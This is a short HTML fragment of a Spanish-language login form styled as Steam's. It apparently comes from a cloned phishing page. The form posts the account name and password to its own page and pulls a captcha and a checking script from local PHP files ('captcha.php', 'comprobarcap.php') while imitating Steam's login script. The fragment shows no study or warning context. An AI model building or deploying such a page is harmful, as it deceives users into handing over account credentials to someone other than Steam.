						<form name="logon" action="" method="POST">
							<div class="login_row">
								<div class="input_title">Nombre de la cuenta de Steam</div>
								<input class="text_input" type="text" name="username" id="input_username" value="">
							</div>
							<div class="login_row">
								<div class="input_title">Contraseña</div>
								<input class="text_input" type="password" name="password" id="input_password" autocomplete="off"/>
							</div>
							
							
							<div class="login_row" id="captcha_entry" style="display: none">
							
							
							
							
							
							<div id="captcha_image_row">
							<img style="float: left;" id="captchaImg" src="captcha.php" border="0" width="206" height="40">
									
									
									
									<div id="captchaRefresh">
										<span class="linkspan" id="captchaRefreshLink">Actualizar</span>
									</div>
									<div style="clear: left;"></div>
								</div>
								<br>
								<div class="input_title">Introduce los caracteres que aparecen arriba</div>
								<input class="text_input" id="input_captcha" type="text" name="captcha_text">
							</div>
							<div style="display"><input type="submit"></div>
						</form>


	<script type="text/javascript" src="comprobarcap.php"></script>
	
	<script language="Javascript">
		$J( function() {
			var LoginManger = new CLoginPromptManager( 'https://store.steampowered.com/', {
				strRedirectURL: "http:\/\/store.steampowered.com\/",
				gidCaptcha: -1			} );

						document.forms['logon'].elements['username'].focus();
			
					} );
	</script>

	